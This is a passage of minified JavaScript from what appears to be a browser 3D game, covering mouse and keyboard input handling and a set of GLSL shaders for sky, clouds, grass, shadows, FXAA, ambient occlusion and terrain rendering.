        Dl = void 0 !== t
    }
    );
    let Al = !1
        , Bl = !1;
    const Rl = t => {
        t.target != Aa.canvas && "chat" != t.target.id || (ji.pointerlock && (Al = !0,
            Aa.canvas.requestPointerLock()),
            Ul("m" + t.button, !0),
            Dl && le.update(t => {
                t && t.discard && t.discard()
            }
            ))
    }
        , zl = t => {
            Ul("m" + t.button, !1),
                Pl = 0,
                Bl = !0
        }
        , Fl = t => {
            t.target == Aa.canvas && bs.update(e => nr(e + (t.deltaY > 0 ? 1 : -1), 2, 18))
        }
        , Zl = t => {
            t.preventDefault()
        }
        , Ul = (t, e, s) => {
            const i = Sl[t];
            return void 0 !== i && (i.down != e && (i.down = e,
                i[e ? "press" : "release"].forEach(t => {
                    t(s)
                }
                ),
                i.store.set(i.down)),
                s && s.preventDefault(),
                !0)
        }
        , Ll = t => {
            if (!Ol(t))
                return;
            const e = t.key.toLowerCase();
            t.ctrlKey && Ul("ctrl+" + e, !0, t) || t.shiftKey && Ul("shift+" + e, !0, t) || Ul(e, !0, t)
        }
        , Nl = t => {
            if (!Ol(t))
                return;
            const e = t.key.toLowerCase();
            Ul("ctrl+" + e, !1),
                Ul("shift+" + e, !1),
                Ul(e, !1)
        }
        , Ol = t => "input" !== t.target.tagName.toLowerCase();
    const jl = {
        frag: "snippet version;out vec4 Tf;in vec2 Zj;in vec3 SB;snippet xg;uniform float time;uniform float QP;uniform sampler2D LG;void main(){gl_FragDepth=0.999997;vec2 Za=vec2(Zj.x+time*0.005,Zj.y);float qf=texture(LG,Za).r;qf+=sin(QP*6.28)*0.04-0.035;if(qf<0.17){discard;}qf=smoothstep(0.3,0.6,qf);qf*=smoothstep(0.0,0.3,SB.y);float IJ=max(dot(Cz,normalize(SB)),0.0);float dh=max(0.0,pow(IJ,6.0))*0.3;vec3 base=mix(Ck+dh+vec3(0.3),Ck+dh+vec3(0.1),qf);Tf=vec4(base,qf);}"
    }
        , ql = {
            frag: "snippet version;precision highp float;in vec2 Zj;uniform float seed;snippet NM;snippet Ug;out vec4 Tf;void main(){vec2 Za=vec2(Zj.x*0.7+seed,Zj.y)*1.5;float qf=0.0;const int aF=8;for(int i=1;i<aF;++i){float Zu=float(i);qf+=noise(Za*pow(Zu,1.2+Zu*0.05)+vec2(pow(Zu,3.5)*0.0002,Zu))/Zu;}qf+=noise(Za*25.0)/15.0;qf+=noise(Za*40.0)/35.0;qf=qf/(float(aF)-5.0)*0.8+0.05;qf-=pow(max(0.0,abs(Zj.x-0.5)),5.0)*18.0;Tf.rgb+=qf;}"
        }
        , Xl = {
            frag: "snippet version;out vec4 Tf;snippet xg;uniform sampler2D Dz;uniform float time;in vec2 Zj;in vec4 MX;void main(){snippet Ft;vec4 result=texture(Dz,Zj);if(result.a<0.25)discard;result.rgb=mix(result.rgb*Kp,result.rgb*1.1,smoothstep(-0.7,0.7,sin(time*6.0+MX.x)));snippet cX;Tf=result;}",
            vert: "snippet version;snippet xg;in vec2 Ek;in vec3 position;in vec3 Lx;in mat4 KP;in vec4 oK;in vec4 Tz;uniform mat4 kX;out vec4 MX;out vec2 Zj;void main(){MX=Tz;KK=KP*vec4(position,1.0);Zj=oK.zw-Ek*oK.xy;snippet YL;gl_Position=kX*KP*vec4(position,1.0);}"
        }
        , Hl = {
            frag: "snippet version;snippet xg;uniform sampler2D jx;in vec3 Wp;in float Zg;out vec4 Tf;in vec3 Oe;uniform float time;in vec2 Zn;void main(){snippet Ft;vec2 Ek=vec2(gl_PointCoord.x,gl_PointCoord.y)+vec2(cos(time*0.5+Oe.x*0.2)*sin(time*4.0+Oe.z*0.5)*(1.0-gl_PointCoord.y)*0.08,0.0);Ek.x=clamp(Ek.x,0.,1.)*0.25;Ek.y=1.0-clamp(Ek.y,0.,1.)*0.25;Ek+=Zn;vec4 result=texture(jx,Ek);if(result.a<max(0.3,0.6-Wl*0.003))discard;float Uk=Zg*(0.9+sin(Oe.x*0.5)*0.05+cos(Oe.z*0.3)*0.05);result.rgb=result.rgb*Wp+result.rgb*Cq*Uk+result.rgb*Kp;snippet cX;Tf=result;}",
            vert: "snippet version;precision highp sampler2DShadow;snippet xg;snippet oh;snippet shadowsEnabled;uniform mat4 jH;uniform mat4 zR;uniform mat4 WH;uniform sampler2DShadow sK;uniform vec2 resolution;in vec4 position;in float info;out vec3 Oe;out vec2 Zn;out float Zg;snippet xK;void main(){float id=1.0;Zn=vec2(fract(info*0.25),-floor(info/4.0)*0.25);if(shadowsEnabled==1){vec4 MF=xK(WH*vec4(position.xyz,1));vec3 Pg=(MF.xyz/MF.w)*0.5+0.5;Zg=texture(sK,Pg);}else{Zg=1.0;}Zg*=0.65;Oe=position.xyz;vec4 KK=jH*vec4(position.xyz,1);vec3 Uk=vec3(0.0);for(int i=0;i<fR;++i){vec3 Hc=GK[i]-Oe.xyz;float Xr=DY[i].w-dot(Hc,Hc);if(Xr>0.0){Xr/=(DY[i].w);Xr=Xr*Xr;Uk+=max(0.2,dot(normalize(Hc),vec3(0.0,1.0,0.0)))*DY[i].rgb*Xr;;}}Wp=Uk*0.65;Wl=length(KK.xyz);if(Wl>min(100.0,NR*0.6)){gl_PointSize=0.;gl_Position.w=0.0;}else{gl_PointSize=resolution[1]/(Wl)*position.w;}gl_Position=zR*KK;}"
        }
        , Kl = {
            frag: "snippet version;precision highp sampler2DShadow;snippet xg;snippet shadowsEnabled;uniform sampler2DShadow sK;uniform int Ud;in vec3 Wp;in vec4 Hw;in vec3 Cb;in vec3 WZ;out vec4 Tf;\n#define RECIPROCAL_PI 0.31830988618\n#define LOG2 1.442695\n#define PI 3.14159265359\nvoid main(){snippet Ft;float zK=(float(gl_FrontFacing)*2.0-1.0);float XG=1.0;if(shadowsEnabled==1&&Ud==1){XG=texture(sK,WZ+vec3(0.0,0.0,-0.001*zK));}vec3 HQ=reflect(Cz,Cb);float wV=max(0.0,dot(normalize(KD-KK.xyz),-HQ));wV=pow(wV*max(0.0,min(1.0,Hw[3]*2.0))*1.5,5.0);vec3 Dz=Hw.rgb;vec3 ambient=Kp*PI;ambient*=RECIPROCAL_PI*Dz;float SU=clamp(dot(Cb*zK,Cz),0.0,1.0);vec3 directional=PI*Wp+(SU*(PI*Cq)+wV)*XG;directional*=RECIPROCAL_PI*Dz;vec3 Qm=Hw.rgb*max(Hw[3]*0.5-0.5,-Hw[3]);vec4 result=vec4(directional+ambient+Qm,1.0);snippet cX;Tf=result;}",
            vert: "snippet version;snippet oh;snippet xg;snippet shadowsEnabled;in vec3 position;in vec3 Lx;in vec4 color;in mat4 KP;uniform mat4 kX;uniform mat4 WH;out vec4 Hw;out vec3 Cb;out vec3 WZ;snippet xK;void main(){Cb=normalize(mat3(KP)*Lx);KK=KP*vec4(position,1.0);Hw=color;snippet YL;snippet GA;if(shadowsEnabled==1){vec4 qb=xK(WH*KK);WZ=(qb.xyz/qb.w)*0.5+0.5;}gl_Position=kX*KK;}"
        }
        , Wl = {
            frag: "snippet version;in vec4 Hw;out vec4 Tf;void main(){Tf=Hw;Tf.a=1.0;}",
            vert: "snippet version;in vec3 position;in vec4 color;in mat4 KP;uniform mat4 kX;out vec4 Hw;void main(){Hw=color;gl_Position=kX*KP*vec4(position,1.0);;}"
        }
        , Yl = {
            frag: "snippet version;precision highp sampler2DShadow;snippet xg;snippet shadowsEnabled;in vec3 Wp;uniform sampler2D Dz;uniform sampler2DShadow sK;uniform int Ud;in vec3 Cb;in vec3 WZ;in vec2 Zj;out vec4 Tf;void main(){snippet Ft;vec4 result=texture(Dz,Zj);if(result.a<0.5)discard;float zK=(float(gl_FrontFacing)*2.0-1.0);float oZ=max(dot(Cb*zK,Cz),0.0);if(shadowsEnabled==1&&Ud==1&&oZ>0.0){float hY=texture(sK,WZ+vec3(0.0,0.0,-0.001*zK));snippet YM;oZ*=max(hY,YM);}result.rgb=result.rgb*Wp+result.rgb*Cq*oZ+result.rgb*Kp;snippet cX;Tf=result;}",
            vert: "snippet version;snippet oh;snippet xg;snippet shadowsEnabled;in vec2 Ek;in vec3 position;in vec3 Lx;in mat4 KP;uniform mat4 kX;uniform mat4 WH;out vec3 Cb;out vec2 Zj;out vec3 WZ;snippet xK;void main(){Cb=normalize(mat3(KP)*Lx);Zj=Ek;KK=KP*vec4(position,1.0);snippet YL;snippet GA;if(shadowsEnabled==1){vec4 qb=xK(WH*KK);WZ=(qb.xyz/qb.w)*0.5+0.5;}gl_Position=kX*KK;}"
        }
        , Vl = {
            vert: "snippet version;snippet oh;snippet xg;snippet shadowsEnabled;in vec2 Ek;in vec3 position;in vec3 Lx;in float gY;in mat4 KP;uniform mat4 kX;uniform mat4 WH;out vec3 Cb;out vec2 Zj;out vec3 WZ;snippet xK;void main(){Cb=normalize(mat3(KP)*Lx);Zj=Ek*gY;KK=KP*vec4(position,1.0);snippet YL;snippet GA;if(shadowsEnabled==1){vec4 qb=xK(WH*KK);WZ=(qb.xyz/qb.w)*0.5+0.5;}gl_Position=kX*KK;}"
        }
        , Gl = {
            frag: "snippet version;precision highp sampler2DShadow;snippet xg;snippet shadowsEnabled;in vec3 Wp;uniform sampler2D Dz;uniform sampler2DShadow sK;uniform int Ud;in vec3 Cb;in vec3 WZ;in vec2 Zj;out vec4 Tf;void main(){snippet Ft;vec4 result=texture(Dz,Zj);if(result.a<0.5)discard;float oZ=max(dot(Cb,Cz),0.0);if(shadowsEnabled==1&&Ud==1&&oZ>0.0){float hY=texture(sK,WZ+vec3(0.0,0.0,-0.001));snippet YM;oZ*=max(hY,YM);}result.rgb=result.rgb*Wp+result.rgb*Cq*oZ+result.rgb*Kp;snippet cX;Tf=result;}"
        }
        , Ql = {
            frag: "snippet version;uniform sampler2D HC;in vec4 Nf;in vec2 Zn;in float Jw;out vec4 Tf;void main(){float Kv=0.5;vec2 Ek=vec2(-0.1+gl_PointCoord.x*1.2,-0.1+gl_PointCoord.y*1.2);if(Jw!=0.0){Ek=vec2(cos(Jw)*(Ek.x-Kv)+sin(Jw)*(Ek.y-Kv)+Kv,cos(Jw)*(Ek.y-Kv)-sin(Jw)*(Ek.x-Kv)+Kv);}Ek.x=clamp(Ek.x,0.,1.)*0.125;Ek.y=1.0-clamp(Ek.y,0.,1.)*0.125;vec4 result=texture(HC,Ek+Zn);result*=Nf;if(result.a<0.01){discard;}Tf=result;Tf.rgb*=Tf.a;Tf.a*=0.33;}",
            vert: "snippet version;in vec3 Za;uniform mat4 jH;uniform mat4 zR;uniform vec2 resolution;in vec4 info;in vec4 Ol;in vec4 Xj;in vec4 Zw;out vec4 Nf;out float Jw;out vec2 Zn;void main(){float id=round(mix(info[2],info[3],info[0]));Zn=vec2(fract(id*0.125),-floor(id/8.0)*0.125);Nf=mix(Xj,Zw,info[0]);Jw=mix(Ol[2],Ol[3],info[0]);vec4 KK=jH*vec4(Za,1);gl_PointSize=(resolution[1]*mix(Ol[0],Ol[1],info[0]))/length(KK.xyz);gl_Position=zR*KK;}"
        }
        , Jl = {
            frag: "snippet version;precision highp float;uniform sampler2D vn;uniform vec2 resolution;in vec2 Zj;out vec4 Tf;\n#define texTop(t, p) texture(t, p, 0.0)\n#define texOff(t, p, o, r) texture(t, p + (o * r), 0.0)\nvec4 FxaaPixelShader(vec2 Za,sampler2D tex,vec2 fxaaQualityRcpFrame,float fxaaQualitySubpix,float fxaaQualityEdgeThreshold,float fxaaQualityEdgeThresholdMin){vec2 Dt;Dt.x=Za.x;Dt.y=Za.y;vec4 Ff=texTop(tex,Dt);\n#define lumaM Ff.y\nfloat fj=texOff(tex,Dt,vec2(0.0,1.0),fxaaQualityRcpFrame.xy).y;float BS=texOff(tex,Dt,vec2(1.0,0.0),fxaaQualityRcpFrame.xy).y;float jg=texOff(tex,Dt,vec2(0.0,-1.0),fxaaQualityRcpFrame.xy).y;float JJ=texOff(tex,Dt,vec2(-1.0,0.0),fxaaQualityRcpFrame.xy).y;float AQ=max(fj,lumaM);float MR=min(fj,lumaM);float fX=max(BS,AQ);float dq=min(BS,MR);float Xm=max(jg,JJ);float BJ=min(jg,JJ);float rangeMax=max(Xm,fX);float rangeMin=min(BJ,dq);float qE=rangeMax*fxaaQualityEdgeThreshold;float range=rangeMax-rangeMin;float PF=max(fxaaQualityEdgeThresholdMin,qE);bool earlyExit=range<PF;if(earlyExit)return Ff;float ql=texOff(tex,Dt,vec2(-1.0,-1.0),fxaaQualityRcpFrame.xy).y;float oN=texOff(tex,Dt,vec2(1.0,1.0),fxaaQualityRcpFrame.xy).y;float pk=texOff(tex,Dt,vec2(1.0,-1.0),fxaaQualityRcpFrame.xy).y;float NH=texOff(tex,Dt,vec2(-1.0,1.0),fxaaQualityRcpFrame.xy).y;float JP=jg+fj;float Jc=JJ+BS;float Yr=1.0/range;float Ew=JP+Jc;float QW=(-2.0*lumaM)+JP;float bH=(-2.0*lumaM)+Jc;float Ng=pk+oN;float EZ=ql+pk;float Dc=(-2.0*BS)+Ng;float Dq=(-2.0*jg)+EZ;float JV=ql+NH;float ja=NH+oN;float Wd=(abs(QW)*2.0)+abs(Dc);float cg=(abs(bH)*2.0)+abs(Dq);float Lu=(-2.0*JJ)+JV;float Ys=(-2.0*fj)+ja;float Az=abs(Lu)+Wd;float kK=abs(Ys)+cg;float Rz=JV+Ng;float SV=fxaaQualityRcpFrame.x;bool horzSpan=Az>=kK;float Lc=Ew*2.0+Rz;if(!horzSpan)jg=JJ;if(!horzSpan)fj=BS;if(horzSpan)SV=fxaaQualityRcpFrame.y;float HZ=(Lc*(1.0/12.0))-lumaM;float FX=jg-lumaM;float TL=fj-lumaM;float XJ=jg+lumaM;float GJ=fj+lumaM;bool pairN=abs(FX)>=abs(TL);float Lz=max(abs(FX),abs(TL));if(pairN)SV=-SV;float xk=clamp(abs(HZ)*Yr,0.0,1.0);vec2 ZI;ZI.x=Dt.x;ZI.y=Dt.y;vec2 Pp;Pp.x=(!horzSpan)? 0.0 : fxaaQualityRcpFrame.x;Pp.y=(horzSpan)? 0.0 : fxaaQualityRcpFrame.y;if(!horzSpan)ZI.x+=SV*0.5;if(horzSpan)ZI.y+=SV*0.5;vec2 Tk;Tk.x=ZI.x-Pp.x;Tk.y=ZI.y-Pp.y;vec2 XC;XC.x=ZI.x+Pp.x;XC.y=ZI.y+Pp.y;float bw=((-2.0)*xk)+3.0;float qh=texTop(tex,Tk).y;float IX=xk*xk;float uH=texTop(tex,XC).y;if(!pairN)XJ=GJ;float zn=Lz*1.0/4.0;float cQ=lumaM-XJ*0.5;float mZ=bw*IX;bool lumaMLTZero=cQ<0.0;qh-=XJ*0.5;uH-=XJ*0.5;bool doneN=abs(qh)>=zn;bool doneP=abs(uH)>=zn;if(!doneN)Tk.x-=Pp.x*1.5;if(!doneN)Tk.y-=Pp.y*1.5;bool doneNP=(!doneN)||(!doneP);if(!doneP)XC.x+=Pp.x*1.5;if(!doneP)XC.y+=Pp.y*1.5;if(doneNP){if(!doneN)qh=texTop(tex,Tk.xy).y;if(!doneP)uH=texTop(tex,XC.xy).y;if(!doneN)qh=qh-XJ*0.5;if(!doneP)uH=uH-XJ*0.5;doneN=abs(qh)>=zn;doneP=abs(uH)>=zn;if(!doneN)Tk.x-=Pp.x*2.0;if(!doneN)Tk.y-=Pp.y*2.0;doneNP=(!doneN)||(!doneP);if(!doneP)XC.x+=Pp.x*2.0;if(!doneP)XC.y+=Pp.y*2.0;if(doneNP){if(!doneN)qh=texTop(tex,Tk.xy).y;if(!doneP)uH=texTop(tex,XC.xy).y;if(!doneN)qh=qh-XJ*0.5;if(!doneP)uH=uH-XJ*0.5;doneN=abs(qh)>=zn;doneP=abs(uH)>=zn;if(!doneN)Tk.x-=Pp.x*4.0;if(!doneN)Tk.y-=Pp.y*4.0;doneNP=(!doneN)||(!doneP);if(!doneP)XC.x+=Pp.x*4.0;if(!doneP)XC.y+=Pp.y*4.0;if(doneNP){if(!doneN)qh=texTop(tex,Tk.xy).y;if(!doneP)uH=texTop(tex,XC.xy).y;if(!doneN)qh=qh-XJ*0.5;if(!doneP)uH=uH-XJ*0.5;doneN=abs(qh)>=zn;doneP=abs(uH)>=zn;if(!doneN)Tk.x-=Pp.x*12.0;if(!doneN)Tk.y-=Pp.y*12.0;doneNP=(!doneN)||(!doneP);if(!doneP)XC.x+=Pp.x*12.0;if(!doneP)XC.y+=Pp.y*12.0;}}}float Yu=Dt.x-Tk.x;float JK=XC.x-Dt.x;if(!horzSpan)Yu=Dt.y-Tk.y;if(!horzSpan)JK=XC.y-Dt.y;bool goodSpanN=(qh<0.0)!=lumaMLTZero;float Ul=(JK+Yu);bool goodSpanP=(uH<0.0)!=lumaMLTZero;float vX=1.0/Ul;bool directionN=Yu<JK;float Jp=min(Yu,JK);bool goodSpan=directionN ? goodSpanN : goodSpanP;float OY=mZ*mZ;float YJ=(Jp*(-vX))+0.5;float CP=OY*fxaaQualitySubpix;float UO=goodSpan ? YJ : 0.0;float Jl=max(UO,CP);if(!horzSpan)Dt.x+=Jl*SV;if(horzSpan)Dt.y+=Jl*SV;return vec4(texTop(tex,Dt).xyz,lumaM);}void main(){vec4 QY=FxaaPixelShader(Zj,vn,1.0/resolution,0.5,0.2,0.0833);Tf=QY;}"
        }
        , tc = {
            frag: "snippet version;precision highp float;uniform sampler2D Pm;uniform sampler2D vn;uniform sampler2D Nh;uniform vec3 Kp;uniform vec2 resolution;uniform float Qx;uniform float NR;in vec2 Zj;out vec4 Tf;const int DK=16;const float LN=float(DK);const vec3 Ae[DK]=vec3[](vec3(0.5381,0.1856,-0.4319),vec3(0.1379,0.2486,0.4430),vec3(0.3371,0.5679,-0.0057),vec3(-0.6999,-0.0451,-0.0019),vec3(0.0689,-0.1598,-0.8547),vec3(0.0560,0.0069,-0.1843),vec3(-0.0146,0.1402,0.0762),vec3(0.0100,-0.1924,-0.0344),vec3(-0.3577,-0.5301,-0.4358),vec3(-0.3169,0.1063,0.0158),vec3(0.0103,-0.5869,0.0046),vec3(-0.0897,-0.4940,0.3287),vec3(0.7119,-0.0154,-0.0918),vec3(-0.0533,0.0596,-0.5411),vec3(0.0352,-0.0631,0.5460),vec3(-0.4776,0.2847,-0.0271));float rand(vec2 co){return fract(sin(dot(co.xy,vec2(12.9898,78.233)))*43758.5453);}const float rF=0.03;const float Qn=0.0000005;const float radius=0.004;const vec2 Dn=vec2(0.0,0.001);const vec2 WK=vec2(0.001,0.0);vec3 normal_from_depth(float LX,vec2 texcoords){float Wx=texture(Nh,texcoords+Dn).r;float QL=texture(Nh,texcoords+WK).r;vec3 p1=vec3(Dn,Wx-LX);vec3 p2=vec3(WK,QL-LX);vec3 Lx=cross(p1,p2);Lx.z=-Lx.z;return normalize(Lx);}void main(){float LX=texture(Nh,Zj).r;vec3 Za=vec3(Zj.xy,LX);vec3 Lx=normal_from_depth(LX,Zj);float FS=NR;float bq=(2.0*0.1*FS)/(FS+0.1-LX*(FS-0.1))/FS;float UJ=radius/bq;float Rs=0.0;vec3 nx=normalize(vec3(rand(Zj.xy),rand(Zj.yx),rand(Zj.xy*1.5)));for(int i=0;i<DK;i++){vec3 Dk=UJ*reflect(Ae[i],nx);vec3 IY=Za+sign(dot(Dk,Lx))*Dk;float NJ=texture(Nh,clamp(IY.xy,0.0,1.0)).r;float difference=LX-NJ;Rs+=step(Qn,difference)*(1.0-smoothstep(Qn,rF,difference));}Rs*=(1.0-smoothstep(0.6,1.0,bq));Rs*=(1.0/LN);Rs=pow(Rs,1.7);float CR=clamp(0.1+1.0-Rs,0.0,1.0);Tf=vec4(mix(Kp*0.2,vec3(1.0),CR),1.0);}"
        }
        , ec = {
            frag: "snippet version;precision highp float;uniform sampler2D Pm;uniform sampler2D vn;uniform vec2 resolution;in vec2 Zj;uniform int step;float weight[5]=float[5](0.227027,0.1945946,0.1216216,0.054054,0.016216);out vec4 Tf;void main(){vec2 wZ=2.0/resolution;vec3 result=vec3(1.0);if(step==0){result=texture(Pm,Zj).rgb*weight[0];for(int i=1;i<5;++i){result+=texture(Pm,Zj+vec2(wZ.x*float(i),0.0)).rgb*weight[i];result+=texture(Pm,Zj-vec2(wZ.x*float(i),0.0)).rgb*weight[i];}}else{result=texture(Pm,Zj).rgb*weight[0];for(int i=1;i<5;++i){result+=texture(Pm,Zj+vec2(0.0,wZ.y*float(i))).rgb*weight[i];result+=texture(Pm,Zj-vec2(0.0,wZ.y*float(i))).rgb*weight[i];}}if(step==1){result=result*texture(vn,Zj).rgb;}Tf=vec4(result,1.0);}"
        }
        , sc = {
            frag: "snippet version;uniform vec4 Xj;uniform vec4 Zw;uniform vec3 offset;in vec2 Zj;out vec4 Tf;void main(){float GF=min(1.,max(0.,Zj.x+offset.x));Tf=mix(Xj,Zw,abs(sin(GF*3.141*offset.z))*offset.y);Tf.a*=sin(Zj.y*3.14);if(Tf.a<0.01){discard;}Tf.rgb*=Tf.a;Tf.a*=0.33;}",
            vert: "snippet version;in vec3 position;in vec2 Ek;out vec2 Zj;uniform mat4 kX;void main(){Zj=Ek;gl_Position=kX*vec4(position,1.0);}"
        }
        , ic = {
            frag: "snippet version;void main(){}",
            vert: "snippet version;in vec3 position;in vec2 Ek;in mat4 KP;uniform mat4 kX;out vec2 Zj;snippet xK;void main(){Zj=Ek;gl_Position=xK(kX*KP*vec4(position,1.0));}"
        }
        , nc = {
            frag: "snippet version;in vec2 Zj;uniform sampler2D Dz;void main(){if(texture(Dz,Zj).a<0.5)discard;}"
        }
        , ac = {
            frag: "snippet version;uniform sampler2D Tb[8];in vec4 TN;in vec4 hA;in vec2 Zj;uniform int Gv;float height;float count;snippet RZ;void computeColor(vec4 color,float value,vec4 info){float Zz=(color.r+color.g+color.b)/3.0;height+=pow(smoothstep(info[1],info[2],Zz)*value,2.5);count+=value;}void main(){height=0.0;if(Gv==1){if(TN[0]>0.0)computeColor(texture(Tb[0],Zj*tinf0[0]),TN[0],tinf0);if(TN[1]>0.0)computeColor(texture(Tb[1],Zj*tinf1[0]),TN[1],tinf1);if(TN[2]>0.0)computeColor(texture(Tb[2],Zj*tinf2[0]),TN[2],tinf2);if(TN[3]>0.0)computeColor(texture(Tb[3],Zj*tinf3[0]),TN[3],tinf3);if(hA[0]>0.0)computeColor(texture(Tb[4],Zj*tinf4[0]),hA[0],tinf4);if(hA[1]>0.0)computeColor(texture(Tb[5],Zj*tinf5[0]),hA[1],tinf5);if(hA[2]>0.0)computeColor(texture(Tb[6],Zj*tinf6[0]),hA[2],tinf6);if(hA[3]>0.0)computeColor(texture(Tb[7],Zj*tinf7[0]),hA[3],tinf7);height/=count;}gl_FragDepth=gl_FragCoord.z-height*0.003;}",
            vert: "snippet version;in vec3 position;in vec2 Ek;in vec4 JZ;in vec4 TQ;uniform mat4 Rg;uniform mat4 zR;out vec2 Zj;out vec4 TN;out vec4 hA;out vec3 Xa;snippet xK;void main(){TN=JZ;hA=TQ;Zj=Ek*16.0;gl_Position=xK(zR*Rg*vec4(position,1.0));}"
        }
        , rc = {
            frag: "snippet version;uniform vec4 color;out vec4 Tf;void main(){Tf=color;}",
            vert: "snippet version;in vec3 position;in vec2 Ek;in vec3 Lx;out vec2 Zj;out vec3 Cb;out vec3 SB;uniform mat4 Rg;uniform mat4 zR;void main(){Zj=Ek;Cb=Lx;SB=position;gl_Position=zR*Rg*vec4(position,1.0);}"
        }
        , oc = {
            frag: "snippet version;precision highp sampler2DShadow;snippet xg;snippet shadowsEnabled;uniform sampler2DShadow sK;uniform int Ud;uniform vec4 color;in vec3 Cb;in vec3 WZ;out vec4 Tf;void main(){snippet Ft;vec4 result=color;float zK=(float(gl_FrontFacing)*2.0-1.0);float oZ=max(dot(Cb*zK,Cz),0.0);if(shadowsEnabled==1&&Ud==1&&oZ>0.0&&WZ.x>0.0&&WZ.x<1.0&&WZ.z>0.0&&WZ.z<1.0){float hY=texture(sK,WZ+vec3(0.0,0.0,-0.001*zK));oZ*=hY;}result.rgb=result.rgb*Cq*oZ+result.rgb*Kp;snippet cX;Tf=result;}",
            vert: "snippet version;in vec3 position;in vec3 Lx;snippet xg;snippet shadowsEnabled;out vec3 Cb;out vec2 Zj;out vec3 WZ;snippet xK;uniform mat4 Td;uniform mat4 kX;uniform mat4 WH;void main(){Cb=Lx;vec4 KK=Td*vec4(position,1.0);snippet YL;if(shadowsEnabled==1){vec4 qb=xK(WH*KK);WZ=(qb.xyz/qb.w)*0.5+0.5;}gl_Position=kX*KK;}"
        }
        , lc = {
            frag: "snippet version;uniform sampler2D Dz;in vec2 Zj;in vec3 Cb;out vec4 Tf;void main(){vec4 QY=texture(Dz,Zj);vec3 Lx=normalize(Cb);vec3 Uk=normalize(vec3(1.0,1.0,0.3));float Fs=dot(Lx,Uk)*0.5;Tf=QY;if(Tf.a<0.2)discard;Tf.rgb*=vec3(0.5)+Fs;}",
            vert: "snippet version;in vec2 Ek;in vec3 position;in vec3 Lx;uniform mat4 KP;uniform mat4 Rg;uniform mat4 zR;out vec2 Zj;out vec3 Cb;void main(){Zj=Ek;Cb=normalize(mat3(KP)*Lx);gl_Position=zR*Rg*vec4(position,1.0);}"
        }
        , cc = {
            frag: "snippet version;snippet xg;uniform float QP;uniform sampler2D Oh;in vec2 Zj;in vec3 SB;out vec4 Tf;void main(){gl_FragDepth=0.999999;vec3 result=vec3(0.0);float IJ=dot(Cz,normalize(SB));float dh=pow((1.0+IJ)*0.5,3.0);vec3 xu=rJ;vec3 PQ=Ck;float c=pow(max(0.0,min(1.0,(1.0-(0.5+SB.y))*2.0)),3.0);float UW=0.0;if(c<0.85){UW=smoothstep(0.85-dh*0.8,0.85,c);}else{UW=1.0-smoothstep(0.85,1.0,c);}c=pow(c,(1.0-dh)*3.0);PQ+=Cq*UW*0.4*dh;xu=mix(rJ*0.8,xu,dh);result=mix(xu,PQ,c);float uA=1.0-sin(QP*6.28)+0.02;float jV=max(0.0,min(1.0,SB.y*5.0))*0.4;result+=texture(Oh,vec2(Cz.x*0.5-Zj.x,Zj.y)).rgb*uA*jV;Tf=vec4(result,1.0);}",
            vert: "snippet version;in vec3 position;in vec2 Ek;uniform mat4 Rg;uniform mat4 zR;out vec2 Zj;out vec3 SB;void main(){Zj=Ek;SB=position;gl_Position=zR*Rg*vec4(SB,1.0);}"
        }
        , hc = {
            frag: "snippet version;precision highp float;in vec2 Zj;uniform float seed;float stars(in vec2 Ek,float scale){Ek*=scale;vec2 s=floor(Ek),f=fract(Ek),p;float k=3.,d;p=.5+.35*sin(11.*fract(sin((s+p+scale)*mat2(7,3,6,5))*5.))-f;d=length(p);k=min(d,k);return smoothstep(0.,k,sin(f.x+f.y)*0.003);}snippet NM;snippet Ug;out vec4 Tf;void main(){vec2 Za=vec2(Zj.x+seed,Zj.y);float n=stars(Zj,10.0);n+=stars(Zj,20.0)*0.5;n+=stars(Zj,30.0)*0.2;n*=noise(Zj*20.0);vec2 vk=vec2(Zj.x*3.0+5.0,Zj.y*5.0);float zJ=noise(vk)*0.9;zJ+=noise(vk*1.5)*0.5;zJ+=noise(vk*2.9)*0.25;zJ*=noise(vk*0.3)*0.1;zJ*=1.0-distance(vec2(0.5),Zj)*2.0;Tf.rgb+=n*4.0+zJ*2.5;}"
        }
        , dc = {
            frag: "snippet version;snippet xg;uniform float QP;in vec2 Zj;out vec4 Tf;void main(){gl_FragDepth=0.999998;float height=max(0.0,min(1.0,abs(sin(QP*6.282))+Zj.y*0.1-0.15));float VT=min(1.0,pow((1.0-height*height),100.0));float circle=0.5-length(vec2(0.5,0.5)-Zj);float alpha=smoothstep(0.0,1.0,circle)*2.0;alpha+=smoothstep(0.4,0.45,circle);Tf.rgba=vec4(mix(vec3(1.0),Ck,VT),alpha);}"
        }
        , uc = {
            frag: "snippet version;precision highp sampler2DShadow;in vec3 Cb;in vec3 GR;in vec3 SB;in vec3 Xa;uniform vec4 QV;snippet xg;snippet shadowsEnabled;snippet RZ;in vec3 Wp;in vec2 Zj;uniform sampler2D Tb[8];in vec4 TN;in vec4 hA;vec4 result;float detail;uniform sampler2DShadow sK;in vec3 WZ;void computeColor(vec4 color,float value,vec4 info){float Zz=max(max(color.x,color.y),color.z);color.a=pow(smoothstep(info[1],info[2],Zz)*value,2.5);detail+=info[3]*color.a;color.rgb=color.rgb*min(1.0,value*0.5+0.7)*color.a;result+=color;}out vec4 Tf;void main(){snippet Ft;if(TN[0]>0.0)computeColor(texture(Tb[0],Zj*tinf0[0]),TN[0],tinf0);if(TN[1]>0.0)computeColor(texture(Tb[1],Zj*tinf1[0]),TN[1],tinf1);if(TN[2]>0.0)computeColor(texture(Tb[2],Zj*tinf2[0]),TN[2],tinf2);if(TN[3]>0.0)computeColor(texture(Tb[3],Zj*tinf3[0]),TN[3],tinf3);if(hA[0]>0.0)computeColor(texture(Tb[4],Zj*tinf4[0]),hA[0],tinf4);if(hA[1]>0.0)computeColor(texture(Tb[5],Zj*tinf5[0]),hA[1],tinf5);if(hA[2]>0.0)computeColor(texture(Tb[6],Zj*tinf6[0]),hA[2],tinf6);if(hA[3]>0.0)computeColor(texture(Tb[7],Zj*tinf7[0]),hA[3],tinf7);result.rgb/=result.a*0.85;detail/=result.a;result.a=1.0;float oZ=dot(Cb,Cz);float zd=0.0;if(oZ>0.0){if(shadowsEnabled==1&&WZ.x>0.0&&WZ.x<1.0&&WZ.y>0.0&&WZ.y<1.0){float hY=texture(sK,WZ);snippet YM;oZ=min(clamp(oZ,0.0,1.0),max(hY,YM));}vec3 HQ=reflect(-Cz,Cb);float iD=max(dot(HQ,GR),0.0);zd=pow(iD,8.5)*2.0;}float vH=length(result.rgb)*3.0*detail;float Jo=pow((vH-0.5),3.0)*0.5+0.2;float Fw=pow((vH-0.5)*oZ,3.0)*1.2;if(vH>1.2){Fw*=1.3;Jo*=1.3;}zd*=Fw;vec3 